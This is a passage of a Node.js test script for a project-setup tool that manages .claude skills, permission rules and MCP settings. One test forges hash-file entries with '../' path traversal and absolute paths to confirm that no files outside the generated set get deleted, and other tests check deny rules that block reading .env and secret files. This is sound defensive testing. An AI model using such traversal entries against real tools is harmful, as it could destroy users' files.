  fs.mkdirSync(path.join(sd, '.claude/skills/my-own-skill'), { recursive: true });
  fs.writeFileSync(path.join(sd, '.claude/skills/my-own-skill/SKILL.md'), '---\nname: my-own-skill\ndescription: mine\n---\n');
  setCfg(sd, 'skills_mode: focused\n');
  const dry = run(sd, ['--dry-run']);
  check(dry.status === 0 && /would be removed/.test(dry.stdout) && ls(sd, 'skills').includes(gone[0]), '--dry-run lists stale skills as "would be removed" and deletes nothing');
  check(run(sd, ['--check']).status === 1, '--check reports stale generated files as out of date');
  const r = run(sd);
  check(r.status === 0 && /stale generated file\(s\) removed/.test(r.stdout), 'init removes skills it generated earlier and no longer generates');
  check(gone.every((n) => !fs.existsSync(path.join(sd, '.claude/skills', n))), 'the stale skill folders are gone, not left empty');
  check(JSON.stringify(ls(sd, 'skills').filter((n) => n !== 'my-own-skill')) === JSON.stringify(focusedSet), 'what remains matches a fresh focused project');
  check(fs.existsSync(path.join(sd, '.claude/skills/my-own-skill/SKILL.md')), 'a skill the user created is never touched');
  const bk = fs.readdirSync(path.join(sd, '.claude/.init-backup'));
  check(bk.length === 1 && fs.existsSync(path.join(sd, '.claude/.init-backup', bk[0], '.claude/skills', gone[0], 'SKILL.md')), 'a copy of each removed file is kept in .init-backup');
  check(fs.existsSync(path.join(sd, '.claude/skills')) && ['.agents', '.codex'].every((m) => !fs.existsSync(path.join(sd, m, 'skills')) || fs.readdirSync(path.join(sd, m, 'skills')).length > 0), '.claude/skills itself and the mirror links survive');
  const again = run(sd);
  check(/0 created, 0 updated/.test(again.stdout) && !/stale generated file/.test(again.stdout) && run(sd, ['--check']).status === 0, 'the run after the cleanup changes nothing and --check passes');

  // --- a stale skill the user edited is kept and reported once
  const ed = mk('stale-edited', 'skills_mode: all\n'); run(ed);
  fs.appendFileSync(path.join(ed, '.claude/skills', gone[0], 'SKILL.md'), '\nmy note\n');
  setCfg(ed, 'skills_mode: focused\n');
  const er = run(ed);
  check(er.status === 0 && fs.existsSync(path.join(ed, '.claude/skills', gone[0], 'SKILL.md')) && new RegExp(`you edited them, so they were kept:.*${gone[0]}`).test(er.stderr), 'a stale skill you edited is kept and named in a warning');
  check(!/you edited them/.test(run(ed).stderr), 'that warning is shown once, not on every run');

  // --- hostile hash file: a hash entry must never delete anything outside the generated files
  const hs = mk('stale-hostile'); run(hs);
  const victim = path.join(base, 'stale-victim.txt'); fs.writeFileSync(victim, 'keep me\n');
  fs.mkdirSync(path.join(base, 'stale-victim'), { recursive: true }); fs.writeFileSync(path.join(base, 'stale-victim/CLAUDE.md'), 'keep me\n');
  fs.writeFileSync(path.join(hs, 'src.txt'), 'keep me too\n');
  const sha = (t) => crypto.createHash('sha256').update(t).digest('hex');
  const hp = path.join(hs, '.claude/.template-hashes.json');
  const hh = JSON.parse(fs.readFileSync(hp, 'utf8'));
  hh['../stale-victim.txt'] = sha('keep me\n'); hh['../stale-victim/CLAUDE.md'] = sha('keep me\n'); hh['src.txt'] = sha('keep me too\n'); hh[victim] = sha('keep me\n');
  fs.writeFileSync(hp, JSON.stringify(hh));
  const hr = run(hs);
  check(hr.status === 0 && fs.existsSync(victim) && fs.existsSync(path.join(base, 'stale-victim/CLAUDE.md')) && fs.existsSync(path.join(hs, 'src.txt')), 'forged hash entries (.., absolute, a non-generated file) never delete anything');

  // --- a removed package: its CLAUDE.md goes, the folder and the user's files stay
  const pk = mk('stale-pkg', 'packages:\n  web:\n    path: apps/web\n');
  fs.mkdirSync(path.join(pk, 'apps/web'), { recursive: true }); fs.writeFileSync(path.join(pk, 'apps/web/index.js'), '//\n');
  run(pk);
  check(fs.existsSync(path.join(pk, 'apps/web/CLAUDE.md')), 'setup: a package CLAUDE.md is generated');
  setCfg(pk); run(pk);
  check(!fs.existsSync(path.join(pk, 'apps/web/CLAUDE.md')) && fs.existsSync(path.join(pk, 'apps/web/index.js')), 'a removed package loses its generated CLAUDE.md but keeps the folder and the code in it');

  // --- stale permission rules
  const pm = mk('stale-perm', 'test_command: "pnpm test"\nlocal_only: ["dumps/"]\n'); run(pm);
  check(settings(pm).permissions.allow.includes('Bash(pnpm test:*)') && settings(pm).permissions.deny.includes('Read(./dumps/**)'), 'setup: test_command and local_only become permission rules');
  editSettings(pm, (st) => { st.permissions.allow.push('Bash(echo mine:*)'); st.permissions.deny.push('Read(./my-secret.txt)'); });
  setCfg(pm, 'test_command: "npm test"\n'); run(pm);
  const a1 = settings(pm).permissions;
  check(!a1.allow.includes('Bash(pnpm test:*)') && a1.allow.includes('Bash(npm test:*)'), 'changing test_command removes the old auto-approved rule and adds the new one');
  check(!a1.deny.includes('Read(./dumps/**)'), 'removing a local_only entry removes its deny rule');
  check(a1.allow.includes('Bash(echo mine:*)') && a1.deny.includes('Read(./my-secret.txt)'), 'rules the user added are preserved');
  setCfg(pm, 'test_command: "npm test"\nprotect_secrets: false\nallow_safe_commands: false\n'); run(pm);
  const a2 = settings(pm).permissions;
  check(!(a2.deny || []).includes('Read(./.env)') && (a2.deny || []).includes('Read(./my-secret.txt)'), 'protect_secrets: false removes only the rules init wrote');
  check(!(a2.allow || []).includes('Bash(npm test:*)') && !(a2.allow || []).includes('Bash(git status:*)') && a2.allow.includes('Bash(echo mine:*)'), 'allow_safe_commands: false removes the safe-command rules but not the user ones');
  const idem = run(pm);
  check(/0 created, 0 updated/.test(idem.stdout) && run(pm, ['--check']).status === 0, 'permission cleanup is idempotent');

  // --- the first run after upgrading has no record of managed rules, so it must not remove anything
  const up = mk('stale-upgrade', 'test_command: "pnpm test"\n'); run(up);
  const mp = path.join(up, '.claude/CONFIGURATION.MANIFEST.JSON');
  const mj = JSON.parse(fs.readFileSync(mp, 'utf8')); delete mj.managedPermissions; fs.writeFileSync(mp, JSON.stringify(mj));
  setCfg(up, 'test_command: "npm test"\n'); run(up);
  check(settings(up).permissions.allow.includes('Bash(pnpm test:*)') && settings(up).permissions.allow.includes('Bash(npm test:*)'), 'without a managed-rules record (older manifest) nothing is removed, only added');

  // --- MCP: mcp_allow / mcp_deny entries that leave the config are removed, the user's own stay
  const mc = mk('stale-mcp', 'mcp_allow: [github, postgres]\nmcp_deny: [slack, figma]\n'); run(mc);
  check(JSON.stringify(settings(mc).enabledMcpjsonServers) === JSON.stringify(['github', 'postgres']) && settings(mc).permissions.deny.includes('mcp__slack'), 'setup: mcp_allow / mcp_deny are written');
  editSettings(mc, (st) => { st.enabledMcpjsonServers.push('mine'); st.permissions.deny.push('mcp__mine-denied'); });
  setCfg(mc, 'mcp_allow: [github]\nmcp_deny: [slack]\n'); run(mc);
  const m1 = settings(mc);
  check(JSON.stringify(m1.enabledMcpjsonServers) === JSON.stringify(['github', 'mine']), 'a server dropped from mcp_allow is no longer enabled; one the user added stays');
  check(!m1.permissions.deny.includes('mcp__figma') && m1.permissions.deny.includes('mcp__slack') && m1.permissions.deny.includes('mcp__mine-denied'), 'a server dropped from mcp_deny is no longer denied; the user\'s own deny rule stays');
  setCfg(mc, ''); run(mc);
  const m2 = settings(mc);
  check(JSON.stringify(m2.enabledMcpjsonServers) === JSON.stringify(['mine']) && !m2.permissions.deny.includes('mcp__slack'), 'removing mcp_allow / mcp_deny from the config removes what init wrote');
  check(/0 created, 0 updated/.test(run(mc).stdout) && run(mc, ['--check']).status === 0, 'MCP cleanup is idempotent');
  const mo = mk('stale-mcp-only', 'mcp_allow: [github]\n'); run(mo);
  check(settings(mo).enableAllProjectMcpServers === false, 'setup: mcp_allow sets enableAllProjectMcpServers false');
  setCfg(mo, ''); run(mo);
  check(settings(mo).enabledMcpjsonServers === undefined && settings(mo).enableAllProjectMcpServers === undefined, 'with no mcp_allow left, the server list and the enableAll flag init set are removed');
  const mu = mk('stale-mcp-user-flag', ''); run(mu);
  editSettings(mu, (st) => { st.enableAllProjectMcpServers = false; }); setCfg(mu, 'mcp_allow: [github]\n'); run(mu); setCfg(mu, ''); run(mu);
  check(settings(mu).enableAllProjectMcpServers === false, 'an enableAllProjectMcpServers the user set themselves is left alone');
}
}

if (on('invalid config')) {
console.log('\n[invalid config]');
const inv = path.join(base, 'invalid');
fs.mkdirSync(inv, { recursive: true });
fs.writeFileSync(path.join(inv, 'project.config.yml'), 'name: X\ntype: banana\nstack: [laravel]\nbranches: {working: a, production: main}\n');
check(run(inv).status === 1, 'bad type is rejected');
}

if (on('cli flags')) {
console.log('\n[cli flags]');
const cf = path.join(base, 'cli-flags');
fs.mkdirSync(cf, { recursive: true });
fs.writeFileSync(path.join(cf, 'project.config.yml'), 'name: F\ntype: web\nstack: [node]\nbranches: {working: dev1, integration: develop, production: main}\n');
const noVal = spawnSync(process.execPath, [INIT, '--target', '--dry-run'], { encoding: 'utf8', cwd: cf });
check(noVal.status === 1 && /--target needs a value/.test(noVal.stderr), '--target followed by a flag is an error, not a path called "--dry-run"');
check(spawnSync(process.execPath, [INIT, '--target', cf, '--config'], { encoding: 'utf8' }).status === 1, '--config with no value is an error');
check(!fs.existsSync(path.join(cf, '.claude')), 'a rejected command line writes nothing');
const wf = fs.readdirSync(path.join(HERE, '.github/workflows')).map((f) => fs.readFileSync(path.join(HERE, '.github/workflows', f), 'utf8')).join('\n');
check([...wf.matchAll(/uses:\s*(\S+)/g)].every((m) => /@[0-9a-f]{40}$/.test(m[1])), 'every GitHub Action in the workflows is pinned to a commit SHA');
}

fs.rmSync(base, { recursive: true, force: true });
if (LIST) { fs.rmSync(base, { recursive: true, force: true }); process.exit(0); }
console.log(failed ? `\n${failed} check(s) FAILED` : '\nAll checks passed');
process.exit(failed ? 1 : 0);
